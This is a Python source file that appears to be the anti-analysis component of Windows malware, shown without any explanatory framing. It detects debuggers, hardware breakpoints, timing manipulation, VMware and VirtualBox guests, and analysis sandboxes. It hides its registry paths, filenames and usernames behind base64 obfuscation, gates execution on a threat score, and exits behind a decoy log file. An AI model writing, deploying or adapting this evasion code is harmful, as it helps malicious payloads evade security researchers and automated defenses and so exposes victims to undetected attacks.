import ctypes
import ctypes.wintypes
import os
import time
import uuid
import sys
import base64
from obfuscation import deobf

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
user32 = ctypes.windll.user32

def _0():
    return kernel32.IsDebuggerPresent() != 0

def _1():
    class _P(ctypes.Structure):
        _fields_ = [
            ("ExitStatus", ctypes.c_long),
            ("PebBaseAddress", ctypes.c_void_p),
            ("AffinityMask", ctypes.c_void_p),
            ("BasePriority", ctypes.c_long),
            ("UniqueProcessId", ctypes.c_void_p),
            ("InheritedFromUniqueProcessId", ctypes.c_void_p),
        ]
    p = _P()
    r = ctypes.c_ulong(0)
    s = ntdll.NtQueryInformationProcess(ctypes.c_void_p(-1), 0, ctypes.byref(p), ctypes.sizeof(p), ctypes.byref(r))
    if s == 0 and p.PebBaseAddress:
        b = ctypes.c_byte.from_address(ctypes.cast(p.PebBaseAddress, ctypes.c_void_p).value + 2)
        return b.value != 0
    return False

def _2():
    CS = 0x4D0
    ctx = ctypes.create_string_buffer(CS)
    ctypes.memset(ctx, 0, CS)
    ctypes.memmove(ctx, ctypes.byref(ctypes.c_ulong(0x10007)), 4)
    if kernel32.GetThreadContext(ctypes.c_void_p(-2), ctx):
        dr0 = ctypes.c_ulonglong.from_buffer(ctx, 0x80).value
        dr1 = ctypes.c_ulonglong.from_buffer(ctx, 0x88).value
        dr2 = ctypes.c_ulonglong.from_buffer(ctx, 0x90).value
        dr3 = ctypes.c_ulonglong.from_buffer(ctx, 0x98).value
        return any((dr0, dr1, dr2, dr3))
    return False

def _3():
    s = time.perf_counter()
    time.sleep(1.5)
    return time.perf_counter() - s < 1.0

def _4():
    r = uuid.getnode()
    p = tuple((r >> (40 - 8 * i)) & 0xFF for i in range(3))
    return p in {
        (0x00, 0x05, 0x69), (0x00, 0x0C, 0x29), (0x00, 0x50, 0x56),
        (0x00, 0x1C, 0x14), (0x08, 0x00, 0x27), (0x00, 0x03, 0xFF),
        (0x00, 0x15, 0x5D), (0x00, 0x0F, 0x4B), (0x00, 0x1E, 0x68),
        (0x00, 0x21, 0xF6),
    }

def _5():
    import winreg
    for k in [
        (winreg.HKEY_LOCAL_MACHINE, deobf("U09GVFdBUkVcVk13YXJlLCBJbmMuXFZNd2FyZSBUb29scw==")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("U09GVFdBUkVcT3JhY2xlXFZpcnR1YWxCb3ggR3Vlc3QgQWRkaXRpb25z")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFZCb3hHdWVzdA==")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFZCb3hNb3VzZQ==")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFZCb3hTRg==")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFZCb3hWaWRlbw==")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXnZtdG9vbHM=")),
        (winreg.HKEY_LOCAL_MACHINE, deobf("SEFSRFdBUkVcREVWSUNFTUFQXFNjY2lcU2NzaSBQb3J0IDBcU2NzaSBCdXMgMFxUYXJnZXQgSWQgMFxMb2dpY2FsIFVuaXQgSWQ=")),
    ]:
        try:
            h = winreg.OpenKey(k[0], k[1], 0, winreg.KEY_READ)
            winreg.CloseKey(h)
            return True
        except OSError:
            pass
    return False

def _6():
    return any(os.path.isfile(f) for f in [
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXHZtbW91c2Uuc3lz"),
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXHZtaGdmcy5zeXM="),
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXFZCb3hHdWVzdC5zeXM="),
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXFZCb3hNb3VzZS5zeXM="),
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXnZtc2NzaS5zeXM="),
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXnZteG5ldC5zeXM="),
        deobf("QzpcV2luZG93c1xTeXN0ZW0zMlxkcnV2ZXJzXnZteF9zdmdhLnN5cw=="),
    ])

def _7():
    targets = {
        deobf("dm10b29sc2QuZXhl"),
        deobf("dm13YXJldHJheS5leGU="),
        deobf("dm13YXJldXNlci5leGU="),
        deobf("VkJveFRyYXkuZXhl"),
        deobf("VkJveENvbnRyb2wuZXhl"),
    }
    try:
        snap = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
        if not snap or snap == ctypes.c_void_p(-1).value:
            return False
        class _P(ctypes.Structure):
            _fields_ = [
                ("dwSize", ctypes.c_ulong),
                ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong),
                ("th32DefaultHeapID", ctypes.c_void_p),
                ("th32ModuleID", ctypes.c_ulong),
                ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong),
                ("szExeFile", ctypes.c_wchar * 260),
            ]
        pe = _P()
        pe.dwSize = ctypes.sizeof(_P)
        if kernel32.Process32FirstW(snap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile in targets:
                    kernel32.CloseHandle(snap)
                    return True
                if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return False

def _8():
    class _M(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]
    m = _M()
    m.dwLength = ctypes.sizeof(_M)
    r = {"a": False, "b": False}
    if kernel32.GlobalMemoryStatusEx(ctypes.byref(m)):
        r["a"] = m.ullTotalPhys < 2 * (1024**3)
    f = ctypes.c_ulonglong(0)
    t = ctypes.c_ulonglong(0)
    if kernel32.GetDiskFreeSpaceExW("C:\\", None, ctypes.byref(t), ctypes.byref(f)):
        r["b"] = t.value < 60 * (1024**3)
    return r

def _9():
    return os.environ.get("USERNAME", "").lower() in {
        deobf("YWRtaW4="), deobf("dXNlcg=="), deobf("c2FuZGJveA=="),
        deobf("dmlydXM="), deobf("bWFsd2FyZQ=="), deobf("dGVzdA=="),
        deobf("ZGVtbw=="), deobf("bGFi"), deobf("YW5hbHlzaXM="), deobf("c2FtcGxl"),
    }

def _10():
    return user32.GetSystemMetrics(0) < 1024 or user32.GetSystemMetrics(1) < 768

def _run(cfg):
    i = {}
    if cfg.get(deobf("Y2hlY2tfZGVidWdnZXI="), True):
        i[deobf("Y2Qw")] = _0()
        i[deobf("Y2Qx")] = _1()
        i[deobf("Y2Qy")] = _2()
    if cfg.get(deobf("Y2hlY2tfdGltaW5n"), True):
        i[deobf("Y3Q=")] = _3()
    if cfg.get(deobf("Y2hlY2tfdm0="), True):
        i[deobf("Y3Yw")] = _4()
        i[deobf("Y3Yx")] = _5()
        i[deobf("Y3Yy")] = _6()
        i[deobf("Y3Yz")] = _7()
    if cfg.get(deobf("Y2hlY2tfc2FuZGJveA=="), True):
        h = _8()
        i[deobf("Y3Mw")] = h["a"]
        i[deobf("Y3Mx")] = h["b"]
        i[deobf("Y3My")] = _9()
        i[deobf("Y3Mz")] = _10()
    return sum(1 for v in i.values() if v), i

def should_run(cfg):
    score, indicators = _run(cfg)
    return score < cfg.get(deobf("dGhyZWF0X3RocmVzaG9sZA=="), 2), score, indicators

def fake_exit():
    try:
        with open(os.path.join(os.environ.get("TEMP", "C:\\Temp"), deobf("d3VhZXNlc3MubG9n")), "w") as f:
            f.write("")
    except Exception:
        pass
    sys.exit(0)
